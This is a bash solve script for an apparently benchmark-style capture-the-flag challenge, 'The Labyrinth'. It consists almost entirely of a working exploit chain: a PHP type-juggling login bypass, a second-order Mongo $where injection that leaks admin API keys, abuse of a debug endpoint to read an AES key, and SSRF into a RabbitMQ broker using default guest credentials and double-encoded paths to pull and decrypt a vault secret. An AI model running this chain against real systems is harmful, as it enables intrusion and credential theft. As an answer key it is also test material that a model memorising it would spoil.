#!/usr/bin/env bash
# APEX-060-25 — "The Labyrinth" (tags: type_juggling, nosql, rabbitmq, aes)
#
# The last one, and the longest: six services, five languages, and a flag that
# is encrypted before anybody is allowed near it.
#
# The v1 login is PHP and compares with `==`, so a password of `true` equals any
# string. A profile stored through v1 is read back by v2, which passes its
# `metadata` into a Mongo query — a second-order injection whose `$where` is
# evaluated on somebody else's request and dumps the API keys. An admin key
# opens a debug endpoint that prints the AES key, and a fetch endpoint that
# reaches the message broker: publish a vault read into `vault-requests`, wait
# for the worker, and take the answer off `vault-responses`.
#
# One detail the corpus's own script gets wrong and this one has to get right.
# The broker's routes are Flask rules containing a literal `%2f`, so a request
# has to carry `%252f` to match after Flask decodes it once. `%2f` decodes to a
# slash and 404s. Encoding is not decoration; it decides which route is hit.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex060-$$"
BROKER="http://rabbitmq-sim:15672/api"
BASIC="$(printf 'guest:guest' | base64 -w0)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# `password: true` is not a password. PHP's `==` says it matches one.
TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/v1/auth/login \
    --set header.Content-Type=application/json \
    --set json.username=admin --set json.password=true |
    body | python3 -c 'import json,sys; print(json.load(sys.stdin)["session_token"])')"

# Stored through v1, evaluated by v2.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/v1/profile/update \
    --set header.Content-Type=application/json \
    --set "header.X-Session-Token=$TOKEN" \
    --set 'json.bio=Regular user' --set 'json.website=https://example.com' \
    --set 'json.metadata.$where=function() { return true; }' >/dev/null

API_KEY="$(send "$SESSION" req_0 --create \
    --set path=/api/v2/search --set query.q=admin \
    --set "header.X-Session-Token=$TOKEN" --set header.Accept-Version=v1 |
    body | python3 -c '
import json, sys
for profile in json.load(sys.stdin)["profiles"]:
    for key in profile.get("leaked_api_keys", []):
        if "admin" in key["permissions"]:
            print(key["key_value"])
            raise SystemExit
')"

AES="$(send "$SESSION" req_0 --create \
    --set path=/api/v2/admin/debug/crypto \
    --set "header.X-API-Key=$API_KEY" |
    body | python3 -c 'import json,sys; print(json.load(sys.stdin)["crypto"]["key_hex"])')"

fetch() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/api/v2/admin/fetch \
        --set header.Content-Type=application/json \
        --set "header.X-API-Key=$API_KEY" \
        --set "json.url=$1" --set json.method=POST \
        --set "json.headers.Authorization=Basic $BASIC" "${@:2}" | body
}

# `%252f`, so that what reaches Flask after one decode is the `%2f` in its rule.
fetch "$BROKER/exchanges/%252f/amq.default/publish" \
    --set json.body.routing_key=vault-requests \
    --set json.body.payload_encoding=string \
    --set 'json.body.payload={"action":"read","path":"secret/data/flag","callback_url":"http://api-v1:3001/api/v1/store-result"}' \
    >/dev/null

# The worker answers into the other queue, when it gets round to it.
for _ in $(seq 1 15); do
    BLOB="$(fetch "$BROKER/queues/%252f/vault-responses/get" \
        --set json.body.count=5 --set json.body.ackmode=ack_requeue_false |
        python3 -c '
import json, sys
for message in json.load(sys.stdin)["body"]:
    payload = json.loads(message["payload"])
    blob = payload["response"]["data"]["data"].get("encrypted_payload")
    if blob:
        print(blob)
        break
')"
    [ -n "$BLOB" ] && break
    sleep 2
done

python3 -c '
import base64, sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
key = sys.argv[1].encode()[:32].ljust(32, b"\0")
raw = base64.b64decode(sys.argv[2])
opened = Cipher(algorithms.AES(key), modes.CBC(raw[:16])).decryptor()
plain = opened.update(raw[16:]) + opened.finalize()
print(plain[: -plain[-1]].decode())
' "$AES" "$BLOB" | flag
